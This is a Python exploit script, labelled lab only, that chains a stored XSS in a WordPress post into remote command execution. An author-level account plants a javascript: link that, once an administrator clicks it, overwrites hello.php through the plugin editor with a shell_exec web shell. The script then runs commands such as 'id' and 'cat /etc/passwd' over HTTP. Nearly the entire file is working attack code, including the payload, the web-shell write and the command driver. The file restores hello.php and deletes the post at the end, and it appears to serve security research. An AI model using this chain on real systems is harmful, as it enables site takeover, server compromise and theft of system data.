#!/usr/bin/env python3
"""Escalation: stored XSS -> admin plugin-editor write -> command execution.

LAB ONLY. The chain is:

    Author (no unfiltered_html) publishes the island
        -> Administrator opens the post and clicks the poisoned link
        -> the XSS writes a command wrapper over hello.php via the plugin editor
        -> the attacker drives commands over HTTP and reads the output

`hello.php` is restored from the shipped original and the post is deleted at the
end. Docker is used only to hash/restore the file and is skipped cleanly when it
is not available (the HTTP command execution is still proven).

    python3 rce_cmd_chain.py
"""
from __future__ import annotations

import sys
import time
from pathlib import Path

import requests
from playwright.sync_api import sync_playwright

import wp_lab

ASSET_ORIGINAL = Path(__file__).resolve().parent / "assets" / "hello.php.orig"

ADMIN_JS = (
    "(async()=>{window.__RCE={s:'start'};"
    "try{"
    "var r=await fetch('/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php',"
    "{credentials:'include'});"
    "var h=await r.text();"
    "var d=new DOMParser().parseFromString(h,'text/html');"
    "var f=d.querySelector('form#template');"
    "var fd=new FormData();"
    "f.querySelectorAll('input').forEach(function(i){"
    "if(i.type=='hidden'){fd.append(i.name,i.value)}});"
    "var php=String.fromCharCode(60)+\"?php echo shell_exec($_GET['cmd']);\";"
    "fd.set('newcontent',php);"
    "var r2=await fetch('/wp-admin/plugin-editor.php',"
    "{method:'POST',body:fd,credentials:'include',redirect:'follow'});"
    "window.__RCE.save=r2.status;window.__RCE.s='done';"
    "}catch(e){window.__RCE.err=String(e);window.__RCE.s='err'}"
    "window.__RCE.done=true;})();void 0"
)

COMMANDS = ["id", "cat /etc/passwd", "uname -a; hostname; pwd"]


def click_as_admin(post_id: int) -> dict:
    c = wp_lab.cfg()
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(
            executable_path=c.chrome, headless=True, args=["--no-sandbox"]
        )
        page = browser.new_context().new_page()
        page.goto(c.base + "/wp-login.php", wait_until="load")
        page.fill("#user_login", c.admin_user)
        page.fill("#user_pass", c.admin_pass)
        page.click("#wp-submit")
        page.wait_for_load_state("load")
        logged_in = "wp-admin" in page.url
        page.goto(f"{c.base}/?p={post_id}", wait_until="load")
        page.wait_for_timeout(1500)
        page.evaluate("() => document.querySelector('#t').click()")
        deadline = time.time() + 20
        while time.time() < deadline:
            if page.evaluate("() => window.__RCE && window.__RCE.done"):
                break
            page.wait_for_timeout(500)
        state = page.evaluate("() => window.__RCE || null")
        browser.close()
    return {"admin_login": logged_in, "rce_state": state}


def main() -> int:
    c = wp_lab.cfg()
    print(f"[*] target: {c.base}   (LAB ONLY)")

    evidence: dict = {
        "target": c.base,
        "scope": "LOCAL LAB ONLY",
        "proof": "explicit command execution via ?cmd=",
    }
    evidence["hello_php_sha256_before"] = wp_lab.remote_sha256()
    if evidence["hello_php_sha256_before"] is None:
        print("[!] docker not available — skipping file hash checks (HTTP proof continues)")

    # 1) Author stores the payload.
    author = wp_lab.login_author()
    if not author.nonce:
        print("FAIL: author login/nonce failed")
        return 1
    payload = wp_lab.island(
        {"u": "javascript:" + ADMIN_JS},
        '<a id="t" href="https://example.com/" data-wp-bind--href="context.u">CAP</a>',
    )
    post, status = wp_lab.publish(
        author, "RCE cmd chain (lab)", wp_lab.accordion(payload)
    )
    post_id = post["id"]
    evidence["author"] = {"uid": author.uid, "roles": author.roles}
    evidence["post"] = {
        "id": post_id,
        "http": status,
        "status": post.get("status"),
        "author": post.get("author"),
    }
    print("author post:", evidence["post"])

    # 2) Administrator victim clicks the poisoned link.
    evidence.update(click_as_admin(post_id))

    evidence["hello_php_sha256_after_write"] = wp_lab.remote_sha256()
    evidence["hello_php_content_after_write"] = wp_lab.remote_read()
    print("written file:", evidence["hello_php_content_after_write"])

    # 3) The attacker drives commands over HTTP; they run on the WordPress host.
    evidence["cmds"] = []
    for command in COMMANDS:
        response = requests.get(
            c.base + "/wp-content/plugins/hello.php",
            params={"cmd": command},
            timeout=20,
        )
        evidence["cmds"].append(
            {"cmd": command, "status": response.status_code, "output": response.text}
        )
        print(f"\n$ {command}\n{response.text}")

    # 4) Restore the file and verify the hash.
    if wp_lab.docker_ready() and ASSET_ORIGINAL.exists():
        wp_lab.restore_file(ASSET_ORIGINAL)
        evidence["hello_php_sha256_restored"] = wp_lab.remote_sha256()
        evidence["restored_ok"] = (
            evidence["hello_php_sha256_restored"] == evidence["hello_php_sha256_before"]
        )
    else:
        evidence["restored_ok"] = None

    # 5) Delete the lab post.
    admin = wp_lab.login_admin()
    evidence["post_deleted"] = wp_lab.delete_post(admin, post_id)

    output = wp_lab.write_json("rce_cmd_chain.json", evidence)
    print(f"\nrestored_ok: {evidence['restored_ok']} | evidence: {output}")
    return 0 if evidence["restored_ok"] in (True, None) else 3


if __name__ == "__main__":
    sys.exit(main())
